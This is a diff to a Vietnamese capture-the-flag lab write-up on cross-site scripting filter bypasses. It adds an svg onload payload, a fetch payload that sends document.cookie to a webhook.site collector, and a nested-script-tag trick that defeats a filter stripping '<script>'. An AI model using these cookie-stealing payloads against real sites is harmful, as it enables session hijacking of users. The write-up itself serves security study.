@@ -98,7 +98,7 @@ Bài này xóa tag script khi nhập vào
 - Bypass đoạn regular expression replace dòng 13
 - Có thể thực thi dc js mà ko cần tag 
 
-## Cách 1
+## Cách 1 thẻ img
 
 ```
 <img%20src="invalid-image"%20onerror="alert(document.cookie)">
@@ -123,6 +123,50 @@ Thành công lấy được cookie con mèo và flag
 
 <img width="959" height="125" alt="image" src="https://github.com/user-attachments/assets/eebdc205-7b14-4078-8ec9-d576d2e04518" />
 
+## Cách 2 thẻ svg
+
+```
+<svg onload="alert(document.cookie)">
+```
+Thử chức năng alert và lấy thông tin cookie
+
+Tiếp theo, sử dụng fetch để bắt request bên webhook
+
+
+```
+<svg onload="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5')">
+```
+Sửa payload để lấy giá trị cookie 
+
+```
+<svg onload="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak='+encodeURIComponent(document.cookie))">
+```
+Được flag 
+
+<img width="845" height="116" alt="image" src="https://github.com/user-attachments/assets/5ce19ed1-a42d-4cde-bae4-ba755dde90a0" />
+
+## Cách 3 : bypass blacklist
+
+<img width="604" height="259" alt="image" src="https://github.com/user-attachments/assets/d54e6334-31a5-44c1-a01d-d74ef816d696" />
+
+Ở đoạn code này, hệ thống chỉ filter cụm `<script>`
+
+Để bypass được đoạn này, ta sẽ thử chèn tag <script> vào giữa đoạn text ta muốn
+
+```
+<scr<script>ipt>alert(document.cookie)</scr<script>ipt>
+```
+
+Sau khi hệ thống filter `<script>` ta được
+
+```
+<script>alert(document.cookie)</script>
+```
+Ta được 
+
+<img width="796" height="194" alt="image" src="https://github.com/user-attachments/assets/dbefce19-424e-4991-9c24-a88568235128" />
+
+
 
 # 3. Lab 3 #
 
@@ -140,7 +184,7 @@ Thành công lấy được cookie con mèo và flag
 
 <img width="638" height="347" alt="image" src="https://github.com/user-attachments/assets/c0795dff-9744-45d6-836b-6a59645828ba" />
 
-## Cách 1 : có thể áp dụng theo cách 1 trong lab 2
+
 
 
 # NOTE
